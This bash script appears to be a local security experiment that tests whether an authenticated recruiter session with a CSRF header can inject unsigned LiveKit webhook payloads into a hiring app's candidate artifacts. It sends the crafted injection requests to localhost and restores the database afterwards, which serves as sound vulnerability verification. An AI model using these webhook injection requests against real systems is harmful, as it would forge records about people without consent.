#!/usr/bin/env bash
# Amended baseline probes, third iteration (DEVIATION D1-2): the second probe
# omitted the attacker's own CSRF header. CSRF protects against cross-site
# requests, not against a malicious authenticated client, who trivially holds
# a matching cookie and header for their own session. This is the actual
# hypothesized condition.
set -uo pipefail

EXP_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$EXP_DIR/../.." && pwd)"
cd "$REPO"

PORT_NUM=8391
export LIVEKIT_URL=wss://fake.livekit.cloud
export LIVEKIT_API_KEY=fake-key
export LIVEKIT_API_SECRET=fake-secret-p0-experiment
export PORT=$PORT_NUM

BK="$(mktemp -d /tmp/certain-p0-backup3.XXXXXX)"
if [ -f data/certain.db ]; then cp data/certain.db "$BK/" 2>/dev/null || true; fi
rm -f data/certain.db data/certain.db-wal data/certain.db-shm

SRV_PID=""
cleanup() { [ -n "$SRV_PID" ] && kill "$SRV_PID" 2>/dev/null; }
trap cleanup EXIT

node src/server/index.ts > /tmp/p0-server.log 2>&1 &
SRV_PID=$!
for i in $(seq 1 40); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "localhost:$PORT_NUM/" 2>/dev/null || true)
  [ "$code" = "200" ] && break
  sleep 0.5
done
echo "server_ready: $(curl -s -o /dev/null -w "%{http_code}" localhost:$PORT_NUM/)"

curl -s -c /tmp/p0-att.txt -X POST "localhost:$PORT_NUM/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"recruiter@gennext.demo","password":"certainty-demo"}' > /dev/null
CSRF=$(grep certainty_csrf /tmp/p0-att.txt | awk '{print $7}')
CID=$(node -e "const{DatabaseSync}=require('node:sqlite');const d=new DatabaseSync('data/certain.db');console.log(d.prepare(\"SELECT id FROM candidates WHERE name='Nadia Rowe'\").get().id)")
echo "target_candidate (nadia): $CID"
echo "attacker_session: recruiter@gennext.demo (csrf header supplied)"

count_artifacts() {
  node -e "const{DatabaseSync}=require('node:sqlite');const d=new DatabaseSync('data/certain.db');console.log(d.prepare('SELECT COUNT(*) n FROM artifacts WHERE candidate_id=?').get('$1').n)"
}

echo
echo "== P2-amended2: AUTHENTICATED + CSRF unsigned webhook, object metadata (H0b predicted: artifact written) =="
BEFORE=$(count_artifacts "$CID")
curl -s -b /tmp/p0-att.txt -H "x-csrf: $CSRF" -X POST "localhost:$PORT_NUM/api/webhooks/livekit" -H 'Content-Type: application/json' \
  -d "{\"participant\":{\"metadata\":{\"candidateId\":\"$CID\"}},\"data\":{\"resume_bullet\":[{\"ownership\":\"injected by an authenticated attacker\",\"action\":\"no signature, no consent\",\"outcome\":\"artifact lands in the spine\"}]}}" \
  -o /tmp/p0-p2am2.json -w "HTTP %{http_code}\n"
AFTER=$(count_artifacts "$CID")
echo "artifact_delta: $((AFTER-BEFORE))"
python3 -c "import json;print('response:', json.load(open('/tmp/p0-p2am2.json')))"
node -e "
const{DatabaseSync}=require('node:sqlite');const d=new DatabaseSync('data/certain.db');
const r=d.prepare(\"SELECT kind, title, created_by FROM artifacts WHERE candidate_id=? ORDER BY created_at DESC LIMIT 1\").get('$CID');
if (r) console.log('newest artifact:', r.kind, '|', r.title, '| created_by:', r.created_by);
"

echo
echo "== P3-amended2: AUTHENTICATED + CSRF unsigned webhook, string metadata (H0c predicted: 400) =="
META=$(python3 -c "import json;print(json.dumps(json.dumps({'candidateId':'$CID'})))")
BEFORE=$(count_artifacts "$CID")
curl -s -b /tmp/p0-att.txt -H "x-csrf: $CSRF" -X POST "localhost:$PORT_NUM/api/webhooks/livekit" -H 'Content-Type: application/json' \
  -d "{\"participant\":{\"metadata\":$META},\"data\":{\"resume_bullet\":[],\"interviewer_note\":{\"evaluation_summary\":\"x\"}}}" \
  -o /tmp/p0-p3am2.json -w "HTTP %{http_code}\n"
AFTER=$(count_artifacts "$CID")
echo "artifact_delta: $((AFTER-BEFORE))"
python3 -c "import json;print('response:', json.load(open('/tmp/p0-p3am2.json')))"

echo
echo "== cleanup: server stopped, database restored =="
kill "$SRV_PID" 2>/dev/null; SRV_PID=""
sleep 0.5
rm -f data/certain.db data/certain.db-wal data/certain.db-shm
[ -f "$BK/certain.db" ] && cp "$BK/certain.db" data/certain.db
echo "restored: $(ls data/ 2>/dev/null | tr '\n' ' ')"
